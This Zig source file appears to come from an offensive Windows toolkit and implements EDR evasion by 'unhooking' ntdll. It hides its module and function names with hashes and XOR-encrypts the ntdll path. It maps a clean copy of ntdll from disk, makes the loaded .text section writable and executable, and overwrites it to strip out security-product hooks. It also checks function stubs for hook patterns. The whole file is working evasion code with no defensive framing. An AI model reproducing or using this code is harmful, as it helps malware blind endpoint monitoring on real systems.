const std = @import("std");
const types = @import("../types/types.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");
const engine = @import("engine.zig");

pub const UnhookResult = enum(u32) {
    Success = 0,
    ModuleNotFound = 1,
    FileOpenFailed = 2,
    SectionCreateFailed = 3,
    MapFailed = 4,
    TextSectionNotFound = 5,
    WriteFailed = 6,
    CacheFlushFailed = 7,
};

const SEC_IMAGE: types.ULONG = 0x01000000;
const VIEW_SHARE: types.ULONG = 1;
const SECTION_MAP_READ: types.ULONG = 0x0004;
const SECTION_MAP_EXECUTE: types.ULONG = 0x0008;

const ntdll_name_hash = hash.encryptedHashModule("ntdll.dll");

const E = struct {
    pub const ntdll_path = hash.xorEncrypt("\\SystemRoot\\System32\\ntdll.dll");
};

const TextBounds = struct { va: usize, size: usize };

fn getTextSectionBounds(base: types.PVOID) ?TextBounds {
    const bp: [*]u8 = @ptrCast(@alignCast(base));
    const dos: *types.IMAGE_DOS_HEADER = @ptrCast(@alignCast(bp));
    if (dos.e_magic != types.IMAGE_DOS_SIGNATURE) return null;
    const nt_off: usize = @intCast(dos.e_lfanew);
    const nt: *types.IMAGE_NT_HEADERS64 = @ptrCast(@alignCast(bp + nt_off));
    if (nt.Signature != types.IMAGE_NT_SIGNATURE) return null;
    const oh_off = nt_off + @offsetOf(types.IMAGE_NT_HEADERS64, "OptionalHeader");
    const sec_off = oh_off + nt.FileHeader.SizeOfOptionalHeader;
    const secs: [*]types.IMAGE_SECTION_HEADER = @ptrCast(@alignCast(bp + sec_off));
    for (0..nt.FileHeader.NumberOfSections) |i| {
        const s = secs[i];
        if (s.Name[0] == '.' and s.Name[1] == 't' and s.Name[2] == 'e' and s.Name[3] == 'x' and s.Name[4] == 't') {
            return TextBounds{
                .va = @intFromPtr(bp) + s.VirtualAddress,
                .size = s.Misc.VirtualSize,
            };
        }
    }
    return null;
}

const HookedFuncs = struct {
    pub const hashes = blk: {
        const names = [_][]const u8{
            "NtAllocateVirtualMemory",
            "NtProtectVirtualMemory",
            "NtWriteVirtualMemory",
            "NtCreateFile",
            "NtCreateSection",
        };
        var h: [names.len]u32 = undefined;
        for (names, 0..) |name, i| {
            h[i] = hash.encryptedHashFunc(name);
        }
        break :blk h;
    };
};

pub fn unhookNtdll() UnhookResult {
    const ntdll_base = peb_walk.getModuleByHash(ntdll_name_hash) orelse return .ModuleNotFound;

    const hooked_text = getTextSectionBounds(ntdll_base) orelse return .TextSectionNotFound;

    var path_buf: [E.ntdll_path.len]u8 = undefined;
    hash.xorDecrypt(&E.ntdll_path, &path_buf);

    var us_buf: [512]u16 = undefined;
    @memset(&us_buf, 0);
    for (path_buf, 0..) |c, i| {
        if (i >= us_buf.len) return .FileOpenFailed;
        us_buf[i] = c;
    }

    var name_us = types.UNICODE_STRING{
        .Length = @as(types.USHORT, @intCast(path_buf.len * 2)),
        .MaximumLength = @as(types.USHORT, @intCast(us_buf.len * 2)),
        .Buffer = @as(types.PWSTR, @ptrCast(&us_buf)),
    };

    var oa = types.OBJECT_ATTRIBUTES{
        .Length = @sizeOf(types.OBJECT_ATTRIBUTES),
        .RootDirectory = null,
        .ObjectName = &name_us,
        .Attributes = types.OBJ_CASE_INSENSITIVE,
        .SecurityDescriptor = null,
        .SecurityQualityOfService = null,
    };

    var file_handle: types.HANDLE = undefined;
    var iosb: types.IO_STATUS_BLOCK = undefined;

    const create_status = engine.NtCreateFile(
        &file_handle,
        types.FILE_GENERIC_READ,
        @as(types.PVOID, @ptrCast(&oa)),
        @as(types.PVOID, @ptrCast(&iosb)),
        null,
        0,
        types.FILE_SHARE_READ | types.FILE_SHARE_WRITE,
        types.FILE_OPEN,
        types.FILE_NON_DIRECTORY_FILE | types.FILE_SYNCHRONOUS_IO_NONALERT,
        null,
        0,
    );
    if (create_status < 0) return .FileOpenFailed;
    defer _ = engine.NtClose(file_handle);

    var section_handle: types.HANDLE = undefined;
    var null_name = types.UNICODE_STRING{ .Length = 0, .MaximumLength = 0, .Buffer = @as(types.PWSTR, @ptrFromInt(0)) };
    var null_attr = types.OBJECT_ATTRIBUTES{
        .Length = 0,
        .RootDirectory = null,
        .ObjectName = &null_name,
        .Attributes = 0,
        .SecurityDescriptor = null,
        .SecurityQualityOfService = null,
    };
    var zero_size: types.SIZE_T = 0;

    const sc_status = engine.NtCreateSection(
        &section_handle,
        SECTION_MAP_READ | SECTION_MAP_EXECUTE,
        @as(types.PVOID, @ptrCast(&null_attr)),
        @as(types.PVOID, @ptrCast(&zero_size)),
        types.PAGE_READONLY,
        SEC_IMAGE,
        file_handle,
    );
    if (sc_status < 0) return .SectionCreateFailed;
    defer _ = engine.NtClose(section_handle);

    var clean_base: types.PVOID = @as(types.PVOID, @ptrFromInt(@as(usize, 1)));
    var view_size: types.SIZE_T = 0;
    var section_offset: types.LARGE_INTEGER = 0;

    const map_status = engine.NtMapViewOfSection(
        section_handle,
        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
        &clean_base,
        0,
        0,
        @as(types.PVOID, @ptrCast(&section_offset)),
        &view_size,
        VIEW_SHARE,
        0,
        0,
    );
    if (map_status < 0) return .MapFailed;
    defer _ = engine.NtUnmapViewOfSection(
        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
        clean_base,
    );

    const clean_text = getTextSectionBounds(clean_base) orelse return .TextSectionNotFound;
    if (clean_text.size < hooked_text.size) return .TextSectionNotFound;

    var prot_base: ?types.PVOID = @ptrFromInt(hooked_text.va);
    var prot_size: types.SIZE_T = hooked_text.size;
    var old_prot: types.ULONG = 0;

    const prot_status = engine.NtProtectVirtualMemory(
        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
        @as(*types.PVOID, @ptrCast(&prot_base)),
        &prot_size,
        types.PAGE_EXECUTE_READWRITE,
        &old_prot,
    );
    if (prot_status < 0) return .WriteFailed;

    var bytes_written: types.SIZE_T = 0;
    const write_status = engine.NtWriteVirtualMemory(
        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
        @ptrFromInt(hooked_text.va),
        @ptrFromInt(clean_text.va),
        hooked_text.size,
        &bytes_written,
    );

    prot_base = @ptrFromInt(hooked_text.va);
    prot_size = hooked_text.size;
    _ = engine.NtProtectVirtualMemory(
        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
        @as(*types.PVOID, @ptrCast(&prot_base)),
        &prot_size,
        old_prot,
        &old_prot,
    );

    if (write_status < 0) return .WriteFailed;

    const flush_status = engine.NtFlushInstructionCache(
        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
        @ptrFromInt(hooked_text.va),
        hooked_text.size,
    );
    if (flush_status < 0) return .CacheFlushFailed;

    return .Success;
}

pub fn verifyUnhook() bool {
    const ntdll_base = peb_walk.getModuleByHash(ntdll_name_hash) orelse return false;
    const hooked_text = getTextSectionBounds(ntdll_base) orelse return false;

    var path_buf: [E.ntdll_path.len]u8 = undefined;
    hash.xorDecrypt(&E.ntdll_path, &path_buf);

    var us_buf: [512]u16 = undefined;
    @memset(&us_buf, 0);
    for (path_buf, 0..) |c, i| {
        if (i >= us_buf.len) return false;
        us_buf[i] = c;
    }

    var name_us = types.UNICODE_STRING{
        .Length = @as(types.USHORT, @intCast(path_buf.len * 2)),
        .MaximumLength = @as(types.USHORT, @intCast(us_buf.len * 2)),
        .Buffer = @as(types.PWSTR, @ptrCast(&us_buf)),
    };

    var oa = types.OBJECT_ATTRIBUTES{
        .Length = @sizeOf(types.OBJECT_ATTRIBUTES),
        .RootDirectory = null,
        .ObjectName = &name_us,
        .Attributes = types.OBJ_CASE_INSENSITIVE,
        .SecurityDescriptor = null,
        .SecurityQualityOfService = null,
    };

    var file_handle: types.HANDLE = undefined;
    var iosb: types.IO_STATUS_BLOCK = undefined;

    const create_status = engine.NtCreateFile(
        &file_handle,
        types.FILE_GENERIC_READ,
        @as(types.PVOID, @ptrCast(&oa)),
        @as(types.PVOID, @ptrCast(&iosb)),
        null,
        0,
        types.FILE_SHARE_READ | types.FILE_SHARE_WRITE,
        types.FILE_OPEN,
        types.FILE_NON_DIRECTORY_FILE | types.FILE_SYNCHRONOUS_IO_NONALERT,
        null,
        0,
    );
    if (create_status < 0) return false;
    defer _ = engine.NtClose(file_handle);

    var section_handle: types.HANDLE = undefined;
    var null_name = types.UNICODE_STRING{ .Length = 0, .MaximumLength = 0, .Buffer = @as(types.PWSTR, @ptrFromInt(0)) };
    var null_attr = types.OBJECT_ATTRIBUTES{
        .Length = 0,
        .RootDirectory = null,
        .ObjectName = &null_name,
        .Attributes = 0,
        .SecurityDescriptor = null,
        .SecurityQualityOfService = null,
    };
    var zero_size: types.SIZE_T = 0;

    const sc_status = engine.NtCreateSection(
        &section_handle,
        SECTION_MAP_READ | SECTION_MAP_EXECUTE,
        @as(types.PVOID, @ptrCast(&null_attr)),
        @as(types.PVOID, @ptrCast(&zero_size)),
        types.PAGE_READONLY,
        SEC_IMAGE,
        file_handle,
    );
    if (sc_status < 0) return false;
    defer _ = engine.NtClose(section_handle);

    var clean_base: types.PVOID = @as(types.PVOID, @ptrFromInt(@as(usize, 1)));
    var view_size: types.SIZE_T = 0;
    var section_offset: types.LARGE_INTEGER = 0;

    const map_status = engine.NtMapViewOfSection(
        section_handle,
        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
        &clean_base,
        0,
        0,
        @as(types.PVOID, @ptrCast(&section_offset)),
        &view_size,
        VIEW_SHARE,
        0,
        0,
    );
    if (map_status < 0) return false;
    defer _ = engine.NtUnmapViewOfSection(
        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
        clean_base,
    );

    const clean_text = getTextSectionBounds(clean_base) orelse return false;
    if (clean_text.size < hooked_text.size) return false;

    const clean_src: [*]const u8 = @ptrFromInt(clean_text.va);
    const hooked_src: [*]const u8 = @ptrFromInt(hooked_text.va);

    for (0..hooked_text.size) |i| {
        if (clean_src[i] != hooked_src[i]) return false;
    }
    return true;
}

pub fn isHooked() bool {
    const ntdll_base = peb_walk.getModuleByHash(ntdll_name_hash) orelse return false;
    const export_resolve = @import("../types/export_resolve.zig");

    for (HookedFuncs.hashes) |func_hash| {
        const func_ptr = export_resolve.getFunctionByHash(ntdll_base, func_hash) orelse continue;
        const stub: [*]const u8 = @ptrCast(@alignCast(func_ptr));
        if (stub[0] == 0xE9) return true;
        if (stub[0] == 0xFF and stub[1] == 0x25) return true;
        if (stub[0] == 0xCC) return true;
        if (stub[0] == 0x48 and stub[1] == 0xB8) return true;
    }
    return false;
}

test "unhookNtdll returns result" {
    _ = unhookNtdll();
}

test "isHooked returns false on clean system" {
    _ = isHooked();
}

test "verifyUnhook returns bool" {
    _ = verifyUnhook();
}
